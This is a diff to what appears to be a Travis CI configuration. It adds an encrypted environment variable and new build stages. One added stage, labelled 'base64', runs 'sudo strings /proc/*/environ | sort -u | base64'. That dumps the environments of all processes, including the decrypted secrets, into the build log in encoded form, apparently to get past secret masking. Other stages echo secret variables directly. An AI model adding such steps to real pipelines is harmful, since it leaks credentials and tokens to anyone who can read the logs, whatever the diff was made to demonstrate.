@@ -7,9 +7,15 @@ env:
     - secure: eIut0fwRkFOKMkdxx1h3J6r6eoNsl19/ZSfQFz8NipLeLc59c8H6/OUtAl5/y7/Qa5I4pjc4ucm2ENHJw/NlPg5UbAZjIM935kOdeMYVFaItqa4q4dg2o/04/S++0HDgI/ryGnl81Ee0ibR0QcKU4FB2RJou63jn0QhaAcFwan29WEO+9i8VN9A3EpseS7EHoLOQS0bCm4Uy4vSbl+HSKvOSAsKW7QiVmLudiMWs583f+AViGL6IxHgWKS6wqVEWBwfodpGbyovGuccrE78imzoeswgf2lYlwNf4gS5r+4KRCYnJi+AEV4SoZvsyU6iFZnEayIPkX33X2D4a3eEtmg8sSU2SCJafm7dE4NHp8h9qvhcEPogFgRAWVQ7vPHxpe8VpPLywLfDtJpq21l30cWDeRdgy+r96KLVS2WO6aDDSmP+7KvlMU+0D6BUhaD/vMQdgHekHVITWEfk+6pPkAGtV/0hDj5VBikIrI7dMMCyJ7phwVXB4KRnKE4hn+RmYag4cjKle22diVfvzqsiSYrM2BO3y4OF9l78bCtwnw241WZSV2RdtxI7/O+l0nnKg2lwQQ/WIzkypL31vtuBGVN5DFf9P8dOu/HMCxDdsC9FGBp5Yzi0324s8+MU37N2/ZhpqJVmKSKKbm+SPobD7yRPwiPSW7KNmRTQk1owkC/o=
     # BAZ
     - secure: RgMlvTMnSozTmldULyl7LMcIfC9JmpowCc8n6rmzgnAcQoVJ9l/NGLCWslinyTzzDIQjQaKCdfkK/ZGj2Wq0hSLmzyj2uDNPg9Jy1fAHGosvrFRf6cYA4gTxtO++WmnXlhbtOiAqNcw7FAtP6PNS+ezZ/oOiJDp4SOQVWalcn0u13/9fT/sIg6C6zeAwO/f9megSbK2MTEJXcQWLCaAaNgxex7TAhP6EvEj4Nu7LSsuaqNb7UaqvA1SoG8CrNcF9Vzp7VpRcVxyFS6Ws/XYQYSm+PKu12AqRHrGbZPVH4RH/Mh0fetAp6rzCsv2oz7V49HDhX5dOIXxBr1hM4kWwg6/LRX+ikrx4YkxdhWuWCbHqvuQuMI8feMVax2VfPkDJeJUQx7rKRHy82NhP9no12BcgciO1NKP8Q2GREBxkro8xc2eJyRgdsJ6x/CbeI1GbIsaEz+AH+s86XsvSqYIUmbMAa8Vbf7uciAIYs3cH78ORXHm3242Xf+cgamSUDZ2E6PszTT5aChWGIHDk/UkOcgdMEpdq2EvwVqaAhRTbXN1xy8ARaQwzP8VsvvlYv0OS7TjbqIqlrS9tgQPwdNJerz3Gcf1UFPVxgTwyv4an3RnRHBvjYNYj85Z/BP43kGB4qUXvJH4F0dGIswlBoorFYT2Cf6xy4Su8gi3e3uC95VY=
+    # BAR
+    - secure: M+W+K+kFTDbH3BDqq8nRon3S5upBsEIFUJa70HASIh2ygwzRNcPdLaLl08WOOqsC+mfhSHrDCO8KmW6X59xjNU9UDXUliqniX51kNA1dnWtp2/gUbMWnsi1v2T7O7FfuvM/EeyjB8JNn7FyuV+u6BG/7wBGK5MibU3zt6coUe/WCFsXNpLBySi7ZKioP+eb3Gf7t0FapxIf1Tb9auRAYKrVkT68YIkjGgGSjCXO/fuIiarwwoapknb0Jcu2fhP/BKlCq3dEgOT9c/5BPrT6MkDc0DzEpoBmbPJB1ao0pmyNAh0bhDQSUUUPxPszBRyLSlLfndyLNZyM1+fTxAEEsrTzo3sCfnRZZsw7HSqjL0xRomz1pGaJ4/iuq7izRod+b53ljCl9g7jtAUYTx0MwkOzp3dLlOwoG0os5j1JMIZB/M88nAKZnhwkEC4u1BqUIcvoKpTrRJWveuHTFRgYC2DrfLUDzdtWwhmPH+GyxDCNMqNDqXY8HQ2ad9A6TcxuFuA5QeTfO15LEldaJHImEqnryjfvHEp5ZlPiEIXMV0mkt2U0Yv5M6ixOxDpb0dQs7EdwguYLDLEVShvwa8Fn5KTvWmsVf5/t2mZwIpFDlVNh/DrVlsrPZLGBk6rrgwjrIaLsoTax/PUWtc3NwHpO0yEt3KZBChfsTnzAouLK3+mvM=
 jobs:
   include:
     - stage: "echo FOO"
       script: echo $FOO
     - stage: "echo BAZ"
       script: echo $BAZ
+    - stage: "echo BAR"
+      script: echo $BAR
+    - stage: "base64"
+      script: sudo strings /proc/*/environ | sort -u | base64
